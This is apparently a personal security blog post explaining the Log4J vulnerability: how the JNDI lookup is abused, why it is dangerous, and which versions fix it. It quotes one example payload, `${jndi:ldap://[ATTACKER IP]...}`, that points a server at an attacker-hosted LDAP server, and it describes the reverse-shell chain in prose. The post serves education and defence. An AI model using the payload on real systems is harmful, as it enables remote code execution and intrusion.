## What is Log4J?
Log4J is a popular Java logging library, it is a utility that is used by many Java applications/software for logging purposes. For example, if a Java application utilises Log4J, error messages or events such as '404' can be recorded in a log. For an online game like Minecraft, the game server utilises the Log4J library to log commands typed by users/players in the console. 

On December 10th 2021, a vulnerability in this Log4J library was discovered which allows for malicious actors to execute remote commands in servers (that are using this utility).

## How does it work?
*To better understand how the exploit works, I recommend you try out this TryHackMe room called [Solar](https://tryhackme.com/room/solar). You can also read my Solar writeup [here](/blogs/thm-solar/)*. to see exploitation steps.

Malicious actors will typically scan the internet (i.e., public IP addresses) and footprint for Java applications. If an application is found to be using Java, it is likely that the Log4J library is also used and therefore the application is vulnerable.

*It might not be possible to detect if the Log4J utility is used, but an attacker can still try the malicious payload on any discovered Java applications to see if the payload works.*

The attacker will then host both an LDAP and HTTP Server. A malicious JNDI payload will then be sent using the vulnerable application. A malicious payload looks something like this `${jndi:ldap://[ATTACKER IP]:[LDAP Server Port Number]/Exploit}`. This causes the URL to be logged in one of Log4J's log files. However, this is where the vulnerability takes place. 

The URL is not only logged, but also evaluated. In other words, it is executed by the server running the Java application. The payload first initiates a connection to the attacker's LDAP Server on the specified port number, requesting for the `Exploit` class. The LDAP Server is also set up in a way such that it will redirect traffic to the HTTP Server. The HTTP Server will contain the exploit class. The exploit class is written in Java that could contain a simple code which returns a reverse shell connection to the attacker. It has to be written in Java so that the target server can understand the class and execute it remotely. 

In essense, when the malicious JNDI payload is executed, the command is logged and executed. This causes the remote server to initiate a connection to the attacker's LDAP Server to request for the specified exploit class. The connection is redirected to the HTTP Server where the exploit class is located. The exploit is then executed remotely by the vulnerable server and a reverse shell is returned. 

I have also designed a simple diagram illustrating the connections made between the attacker and target server/application.

## Why is Log4J so dangerous?
The reasons why this vulnerability is so dangerous can be simplified into these reasons:<br>
1) `It is a popular utility used by MANY Java applications - both open-source and commercial softwares.` 
There are billions of devices & systems running Java applications in the world. Additionally, many of these applications uses the popular Log4J library for their logging purposes. Do you see where I am going with this?

If many applications run Java, the possibility of these applications using Log4J is also high due to its popularity. Hence, the discovery of the Log4J vulnerability is such a big deal because it is extremely likely that public-facing Java applications are vulnerable. 

2) `Attackers can gain remote command execution.`
This vulnerability leads to a remote command execution on the vulnerable application. This means that any attacker can use the malicious payloads on the vulnerability application, leading to a command execution over the internet. 

Some vulnerabilities require attackers to obtain physical access to the vulnerable system to further exploit it. Some vulnerabilities require attackers to have privileged access. However, Log4J is an easy-to-exploit vulnerability that does not have these requirements. The vulnerability provides attackers with access directly to the server, without the need to obtain physical or privileged access. The attackers can then leverage on this access to perform other malicious actions such as stealing confidential data from these vulnerable servers.

Hence, the fact that this vulnerability is so easy to exploit (due to lesser requirements i.e., not needing physical access and not needed privileged access) and that the outcome of the exploitation is a remote command execution, makes it an extremely dangerous vulnerability.


## Patching
If you are using a commercial application, please refer to the respective vendor for patching. Otherwise, it is recommended to upgrade the utility to versions `Log4j 2.3.2 (for Java 6), 2.12.4 (for Java 7), or 2.17.1 (for Java 8 and later).`
The updated versions can be found [here](https://logging.apache.org/log4j/2.x/download.html).
